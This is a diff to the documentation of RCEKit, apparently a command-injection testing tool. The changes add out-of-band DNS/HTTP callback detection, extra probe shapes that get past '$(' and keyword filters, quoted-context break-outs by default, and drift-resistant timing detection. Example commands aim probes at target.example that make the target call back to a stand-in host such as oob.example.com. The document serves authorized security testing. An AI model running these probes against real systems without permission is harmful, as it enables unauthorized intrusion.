@@ -164,8 +164,19 @@ reported separately.
 | Anything, first pass | `reflected,eval` | cheap, safe, no state change |
 | A shell sink (`system()`, backticks, `exec`) | `reflected` | cheap |
 | A template engine or expression language | `eval` | cheap |
-| Execution with no output at all | `time` | slow — each probe waits on a real delay |
+| No output, but the target has egress | `oob` | one listener, no state change (see [Out-of-band callbacks](#out-of-band-callbacks)) |
 | No output, but you control a web root | `file` | writes files (see [No-egress targets](#no-egress-targets)) |
+| Execution with no output and no egress | `time` | slow — each probe waits on a real delay |
+
+**Probe depth trades requests for coverage.** By default (`--probe-depth full`)
+each sink gets three extra probe shapes beyond the canonical ones, because the
+canonical ones share two blind spots: they route their arithmetic through a
+command substitution, and they spell the command `echo`/`expr`. A sink that
+strips `$(` blocks both (`$((` starts with `$(`), and so does a keyword filter —
+while the target stays trivially exploitable through a plain `;`. The extra
+shapes use `awk` and a bare `expr`, and one set comments out whatever the
+application appends after the injection point. Pass `--probe-depth quick` on a
+rate-limited target to halve the requests and send only the canonical probes.
 
 **Scope the environments to cut noise.** The shell methods (`reflected`, `file`,
 `time`) apply to any environment whose runtime reaches a shell — the shell
@@ -215,17 +226,24 @@ for the report.
 ## Injecting inside quotes
 
 If the sink builds `ping '<input>'`, a leading `;` never fires — it is inside the
-quoted string. Use the matching context, whose break-out closes the quote and
-supplies its own separator:
+quoted string. The break-out has to close the quote first, which is what the
+`shell_single_quoted` / `shell_double_quoted` contexts do.
+
+**You no longer have to ask for them.** Both are probed by default, so a quoted
+sink is reached by an ordinary run. Naming `--contexts` explicitly turns that
+off — a narrowed run is a deliberate choice about what to send, and RCEKit will
+not widen it behind you:
 
 ```bash
+# Reaches a quoted sink on its own
+python rcekit.py --acknowledge-consent \
+  --verify-url "https://target.example/ping?ip=FUZZ" --methods reflected
+
+# Only the quoted contexts, when you already know the sink's shape
 python rcekit.py --acknowledge-consent \
   --verify-url "https://target.example/ping?ip=FUZZ" --methods reflected \
-  --contexts shell_single_quoted
+  --contexts shell_single_quoted shell_double_quoted
 ```
-
-Use `shell_double_quoted` for `ping "<input>"`. If you don't know which, pass both
-— they are cheap and mutually exclusive in practice.
 
 ---
 
@@ -268,9 +286,17 @@ injection context or a different separator, not heavier obfuscation.
 
 ## Blind targets
 
-No output channel at all? Timing is the fallback. RCEKit fires a controlled
-`0/N/2N` delay series and requires the response time to track it **linearly** — a
-one-off slow response (jitter, GC pause, noisy neighbour) fails the regression.
+No output channel at all? Reach for `oob` first — it is the only method that can
+*confirm* a blind sink (see [Out-of-band callbacks](#out-of-band-callbacks)).
+Timing is the fallback when the target has no egress either.
+
+RCEKit screens each candidate separator with one cheap probe, then fires a
+controlled `0/N/2N` delay series through whichever one actually delayed, and
+requires the response time to track it — about one second of latency per injected
+second. A one-off slow response (jitter, GC pause, noisy neighbour) fails the
+regression, and so does a target that is merely getting slower as the run goes
+on: the probe order is randomised and the request index is modelled as a separate
+term, so drift cannot masquerade as a sleep.
 
 ```bash
 python rcekit.py --acknowledge-consent \
@@ -319,10 +345,42 @@ freshly random each run.
 
 ## Out-of-band callbacks
 
-For blind classes that reach out — Log4Shell/JNDI, DNS exfil, async jobs — RCEKit
-ships its own HTTP/DNS listener, so you don't need interactsh or Collaborator.
+RCEKit ships its own HTTP/DNS listener, so you don't need interactsh or
+Collaborator. There are two ways to use it.
 
-Generate OOB payloads with a domain you control, then listen and correlate:
+### As a detection method
+
+`--methods oob` starts the listener in-process and drives the whole loop itself:
+it fires probes that ask the target to resolve or fetch `<token>.<oob-host>`,
+waits for the callbacks, and reports each probe by whether *its own* token came
+back. This is the only method that reaches `confirmed` on a sink that returns
+nothing and has no writable web root.
+
+```bash
+python rcekit.py --acknowledge-consent \
+  --verify-url "https://target.example/ping?ip=FUZZ" \
+  --methods reflected,oob --oob-host oob.example.com --listen-dns-port 53
+```
+
+`--oob-host` must be something the **target** can reach that arrives at your
+listener: a domain whose NS records are delegated to this host, or a routable IP.
+With a bare IP the token rides in the URL path instead of a DNS label, and the
+DNS shapes are skipped rather than sent as probes that could never call back.
+
+The DNS shapes matter more than the HTTP ones: egress filtering that blocks
+outbound HTTP usually still lets the resolver out. One shape goes further and
+puts a computed value in the label — `$((a+b)).<token>.<host>` — so the callback
+proves the shell *evaluated arithmetic*, not merely that something resolved a
+name it was handed.
+
+This makes the target open outbound connections, which is why it never runs
+unless you name the host.
+
+### As a standalone listener
+
+For blind classes that reach out on their own schedule — Log4Shell/JNDI, DNS
+exfil, async jobs — generate OOB payloads with a domain you control, then listen
+and correlate:
 
 ```bash
 python rcekit.py --acknowledge-consent --categories oob \
